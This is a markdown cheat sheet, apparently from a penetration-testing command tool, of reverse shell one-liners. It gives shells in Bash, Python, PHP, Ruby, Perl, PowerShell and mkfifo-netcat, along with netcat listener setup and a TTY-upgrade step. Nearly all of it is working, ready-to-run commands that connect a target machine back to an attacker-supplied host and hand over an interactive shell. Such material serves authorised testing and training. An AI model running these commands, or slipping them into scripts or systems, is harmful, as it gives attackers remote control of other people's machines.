# Reverse Shells

> Common reverse shell one-liners for various languages and listener setup commands

<!-- tags: reverse-shell, shell, payload, one-liner -->

---

## listener netcat
Start a netcat listener to catch any of the reverse shells below.

```bash
nc -lvnp {{LPORT:port:4444}}
```

<!-- meta: risk=low | phase=exploit | tags=listener,nc -->

---

## listener netcat rlwrap
Catch a reverse shell with readline support for arrow keys and history.

```bash
rlwrap nc -lvnp {{LPORT:port:4444}}
```

<!-- meta: risk=low | phase=exploit | tags=listener,rlwrap -->

---

## reverse shell bash
Send a reverse shell using Bash /dev/tcp.

```bash
bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}} 0>&1
```

<!-- meta: risk=high | phase=exploit | tags=bash,reverse-shell -->

---

## reverse shell python3
Send a reverse shell using Python 3.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{LHOST:ip}}",{{LPORT:port:4444}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

<!-- meta: risk=high | phase=exploit | tags=python,reverse-shell -->

---

## reverse shell php
Send a reverse shell using PHP from the command line.

```bash
php -r '$sock=fsockopen("{{LHOST:ip}}",{{LPORT:port:4444}});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

<!-- meta: risk=high | phase=exploit | tags=php,reverse-shell -->

---

## reverse shell ruby
Send a reverse shell using Ruby.

```bash
ruby -rsocket -e 'f=TCPSocket.open("{{LHOST:ip}}",{{LPORT:port:4444}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

<!-- meta: risk=high | phase=exploit | tags=ruby,reverse-shell -->

---

## reverse shell perl
Send a reverse shell using Perl.

```bash
perl -e 'use Socket;$i="{{LHOST:ip}}";$p={{LPORT:port:4444}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

<!-- meta: risk=high | phase=exploit | tags=perl,reverse-shell -->

---

## reverse shell powershell
Send a reverse shell using PowerShell (for Windows targets).

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{LHOST:ip}}',{{LPORT:port:4444}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

<!-- meta: risk=high | phase=exploit | tags=powershell,windows,reverse-shell -->

---

## reverse shell mkfifo netcat
Send a reverse shell using a named pipe and netcat (works when bash /dev/tcp is unavailable).

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST:ip}} {{LPORT:port:4444}} >/tmp/f
```

<!-- meta: risk=high | phase=exploit | tags=mkfifo,nc,reverse-shell -->

---

## upgrade tty full
Upgrade a basic reverse shell to a fully interactive TTY. After spawning, press Ctrl+Z, run `stty raw -echo; fg`, then `export TERM=xterm`.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<!-- meta: risk=safe | phase=post | tags=tty,upgrade,interactive -->
